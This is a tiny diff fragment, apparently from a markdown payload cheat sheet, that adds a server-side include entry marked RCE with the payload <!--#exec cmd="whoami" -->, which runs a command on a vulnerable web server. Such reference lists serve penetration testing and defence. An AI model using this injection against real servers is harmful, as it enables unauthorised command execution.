@@ -45,3 +45,8 @@ RCE
 
 
 
+**SSI**:
+
+
+RCE
+`<!--#exec cmd="whoami" -->`|
